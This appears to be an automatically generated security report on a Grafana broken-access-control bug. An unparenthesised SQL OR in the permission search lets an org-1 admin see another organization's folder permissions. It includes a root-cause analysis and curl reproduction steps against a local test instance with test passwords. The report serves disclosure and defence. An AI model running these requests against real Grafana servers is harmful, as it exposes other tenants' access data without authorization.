# Action-set permission search escapes organization filtering

- **id**: `0716bfe66f593245`  
- **class**: broken-access-control (CWE-200)  
- **severity**: medium  
- **status**: reproduced  
- **disclosure**: novel [https://grafana.com/security/security-advisories/, https://grafana.com/security/security-advisories/cve-2026-21721/, https://grafana.com/security/security-advisories/cve-2022-36062/, https://github.com/grafana/grafana/security/advisories, https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/api-legacy/access_control/] - Checked at 2026-06-06T19:07:52.790913+00:00. Searched Grafana advisories, GitHub advisories, NVD-oriented queries, and exact code/endpoint strings for SearchUsersPermissions/actionPrefix/action-set org filtering. Public advisories include related but distinct folder/dashboard permission-management issues (CVE-2026-21721, CVE-2022-36062), and the Grafana advisory index does not list an access-control users/permissions search cross-org action-set leak. No exact public report was found.  

**Data flow**: `targets/grafana/pkg/services/accesscontrol/api/api.go:93` -> `targets/grafana/pkg/services/accesscontrol/database/database.go:268`

## Evidence

SearchUsersPermissions builds a WHERE clause beginning with (up.org_id = ? OR up.org_id = ?). When ActionPrefix is present and action sets are resolved, database.go appends `AND p.action LIKE ? OR p.action IN (...)` without parentheses. Because SQL AND binds more tightly than OR, rows matching an action-set permission satisfy the right-hand branch without satisfying the preceding organization predicate. For namespacedId searches, the subqueries select the target user's assignments across all orgs and the service returns the DB result directly after merging, so matching action-set permissions from another org can be exposed. For all-user searches, the service filters visible user IDs but still merges the returned DB permissions for those IDs, so a visible current-org user can have cross-org action-set permissions included. This is a route-to-resource authorization gap caused by a missing parenthesized action condition around the actionPrefix/actionSet predicate.

## Reproduction

- attempted: True | success: True
- observation: A temporary org-2 folder permission assigned to viewer was returned by an org-1 permission search run by editor after editor was promoted to org-1 Admin for route authorization. The same search before the org-2 grant did not include the org-2 folder UID. Cleanup restored editor to Editor, deleted the temporary folder, and deleted the temporary org.
- response evidence: Baseline: editor-as-org1-admin GET /api/access-control/users/permissions/search?actionPrefix=folders&namespacedId=user:3 -> HTTP 200 {"3":{"folders:read":["folders:uid:general"]}}.
Fixture: created org 4, folder uid dfocffd17gyyoe, and granted viewer user 3 View on that org-2 folder.
After: same org-1 request -> HTTP 200 {"3":{"folders:read":["folders:uid:dfocffd17gyyoe","folders:uid:general"]}}.
Cross-signal: actionPrefix=dashboards also returned folders:uid:dfocffd17gyyoe in the org-1 response.
Cleanup: deleted folder, restored editor role to Editor, and deleted temporary org.
Generated PoC run: PASS: org-1 permission search leaked org-5 folder scope folders:uid:ffocfny3qomwwf; baseline {"3":{"folders:read":["folders:uid:general"]}}; after {"3":{"folders:read":["folders:uid:general","folders:uid:ffocfny3qomwwf"]}}. Cleanup sanity check: /api/orgs returned only Main Org.; editor role restored to Editor.

Recorded request(s):
```http
curl -sS -c /tmp/tf_ac_admin.jar -H 'Content-Type: application/json' -d '{"user":"admin","password":"7erSflXeXmPF47qDOkAc"}' http://localhost:31655/login
curl -sS -c /tmp/tf_ac_editor.jar -H 'Content-Type: application/json' -d '{"user":"editor","password":"7ZhgiZfCQxSYu2MtlRIg"}' http://localhost:31655/login
curl -sS -b /tmp/tf_ac_admin.jar -X PATCH -H 'Content-Type: application/json' -d '{"role":"Admin"}' http://localhost:31655/api/orgs/1/users/2
curl -sS -b /tmp/tf_ac_editor.jar 'http://localhost:31655/api/access-control/users/permissions/search?actionPrefix=folders&namespacedId=user:3'
curl -sS -b /tmp/tf_ac_admin.jar -X POST -H 'Content-Type: application/json' -d '{"name":"tf-cross-org-folder-<unique>"}' http://localhost:31655/api/orgs
curl -sS -b /tmp/tf_ac_admin.jar -X POST -H 'Content-Type: application/json' -d '{"loginOrEmail":"viewer","role":"Viewer"}' http://localhost:31655/api/orgs/<org2_id>/users
curl -sS -b /tmp/tf_ac_admin.jar -X POST http://localhost:31655/api/user/using/<org2_id>
curl -sS -b /tmp/tf_ac_admin.jar -X POST -H 'Content-Type: application/json' -d '{"title":"tf-cross-folder-<unique>"}' http://localhost:31655/api/folders
curl -sS -b /tmp/tf_ac_admin.jar -X POST -H 'Content-Type: application/json' -d '{"permission":"View"}' http://localhost:31655/api/access-control/folders/<org2_folder_uid>/users/3
curl -sS -b /tmp/tf_ac_admin.jar -X POST http://localhost:31655/api/user/using/1
curl -sS -b /tmp/tf_ac_editor.jar 'http://localhost:31655/api/access-control/users/permissions/search?actionPrefix=folders&namespacedId=user:3'
python3 workspace/report/0716bfe66f593245/poc.py --url http://localhost:31655
```

## Run the PoC
```bash
pip install requests   # if needed
python3 poc.py
```

_generated 2026-06-06T19:30:59.420384+00:00_